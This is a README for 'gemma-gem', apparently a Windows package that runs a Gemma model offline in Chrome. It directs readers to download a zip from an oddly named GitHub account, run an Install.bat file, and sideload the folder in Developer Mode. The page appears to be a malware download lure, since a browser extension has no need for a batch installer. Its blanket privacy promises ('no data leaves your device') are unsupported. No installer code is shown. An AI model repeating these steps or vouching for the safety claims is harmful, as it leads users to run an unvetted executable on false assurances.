# 💎 gemma-gem - Private AI running on your computer

[![](https://img.shields.io/badge/Download_Gemma_Gem-Blue.svg)](https://github.com/Tortuous-surfacechemistry208/gemma-gem)

Gemma Gem lets you use the Gemma 4 artificial intelligence model directly on your Windows computer. It works inside your web browser. The software stays on your machine. You do not need an account or an internet connection to use the model. No data leaves your device. This keeps your private information safe.

## 🛠️ System Requirements

You need a modern Windows computer to run this tool. Ensure your system meets these standards for the best experience:

- Operating System: Windows 10 or Windows 11.
- Web Browser: Google Chrome version 120 or newer.
- Processor: An Intel Core i5 or AMD Ryzen 5 or better.
- Memory: At least 8 gigabytes of RAM.
- Graphics Card: A dedicated GPU with at least 4 gigabytes of video memory.
- Storage: 5 gigabytes of free disk space for model files.

## 📥 How to download and install

1. Visit the [official releases page](https://github.com/Tortuous-surfacechemistry208/gemma-gem) to get the software.
2. Look for the file ending in .zip under the Assets section.
3. Click the file name to start the download to your computer.
4. Locate the downloaded folder in your Downloads directory.
5. Right-click the folder and select Extract All.
6. Choose a location on your hard drive for the files and click Extract.

## 🚀 Setting up the application

1. Open the folder you just extracted.
2. Find the file named Install.bat.
3. Double-click this file. A black window will open while the computer prepares the files.
4. Wait for the process to finish. The window closes automatically when the installation ends.
5. Open Google Chrome.
6. Type chrome://extensions in the address bar and press Enter.
7. Click the toggle switch in the top right corner to turn on Developer Mode.
8. Click the Load unpacked button on the top left.
9. Select the folder where you installed the application files.
10. The Gemma Gem icon now appears in your browser toolbar.

## ✨ Using the software

Click the Gemma Gem icon in your browser toolbar to open the interface. The first time you use the tool, it needs a few moments to load the model into your system memory. You will see a loading bar at the top of the interface.

Once the loading bar finishes, the chat box activates. Type your request into the text field at the bottom of the window and press Enter. The model responds directly in the chat window. 

The model uses your computer's WebGPU hardware. This process uses your graphics card to generate text. You may notice your computer fans spin faster during this time. This is normal.

## 🛡️ Privacy and Safety

This software runs entirely offline. Because the code stays on your machine, it cannot send your conversations to a server. You keep full control over your inputs. If you delete the extension from your browser, all related data disappears from your hard drive immediately.

## 🔑 Common issues

If the model fails to load, check that your graphics card drivers are current. Outdated drivers prevent the browser from using the hardware acceleration required by the software. Update your Nvidia or AMD drivers from their respective websites to fix loading errors.

If you encounter performance issues, close other programs that use your graphics card. Games or video editing software compete for the same hardware resources. Closing these programs frees up space for the model to work faster.

This tool works best with Google Chrome. Other browsers might block the WebGPU features needed for the model to run. Use the latest version of Chrome for the best experience.
